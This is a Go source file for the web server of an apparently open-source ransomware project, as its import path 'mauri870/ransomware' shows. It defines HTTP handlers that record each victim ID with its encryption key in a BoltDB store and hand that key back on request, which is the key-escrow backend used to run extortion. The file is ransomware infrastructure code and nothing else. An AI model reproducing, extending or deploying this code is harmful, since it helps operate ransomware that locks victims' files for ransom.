package web

import (
	"encoding/json"
	"fmt"
	"net/http"

	"github.com/labstack/echo"
	"github.com/mauri870/ransomware/repository"
)

type Engine struct {
	*echo.Echo
	PrivateKey []byte
	Database   *repository.BoltDB
}

// NewEngine return a new echo.Echo instance
func NewEngine() *Engine {
	return &Engine{
		Echo:       echo.New(),
		PrivateKey: []byte{},
		Database:   nil,
	}
}

// AddKeys persists a new key pair
func (e *Engine) AddKeys(c echo.Context) error {
	// Get the payload from context
	payload := c.Get("payload").([]byte)

	// Parse the json keys
	var keys map[string]string
	if err := json.Unmarshal(payload, &keys); err != nil {
		// Bad Json
		return c.JSON(http.StatusBadRequest, ApiResponseBadJson)
	}

	available, err := e.Database.IsAvailable(keys["id"], "keys")
	if err != nil && err != repository.ErrorBucketNotExists {
		return c.JSON(http.StatusInternalServerError, ApiResponseInternalError)
	}

	if available || err == repository.ErrorBucketNotExists {
		err = e.Database.CreateOrUpdate(keys["id"], keys["enckey"], "keys")
		if err != nil {
			return c.JSON(http.StatusInternalServerError, "")
		}

		c.Logger().Printf("Successfully saved key pair %s - %s", keys["id"], keys["enckey"])
		// Success \o/
		return c.NoContent(http.StatusNoContent)
	}

	// Id already exists
	return c.JSON(http.StatusConflict, ApiResponseDuplicatedId)
}

// GetEncryptionKey retrieves a encryption key for a given id
func (e *Engine) GetEncryptionKey(c echo.Context) error {
	id := c.Param("id")
	if len(id) != 32 {
		return c.JSON(http.StatusBadRequest, ApiResponseBadRequest)
	}

	// If nothing goes wrong, retrieve the encryption key...
	enckey, err := e.Database.Find(id, "keys")
	if err != nil {
		return c.JSON(http.StatusTeapot, ApiResponseResourceNotFound)
	}

	return c.JSON(http.StatusOK, fmt.Sprintf(`{"status": 200, "enckey": "%s"}`, enckey))
}

// Index simply returns a OK
func (e *Engine) Index(c echo.Context) error {
	return c.String(http.StatusOK, "OK")
}
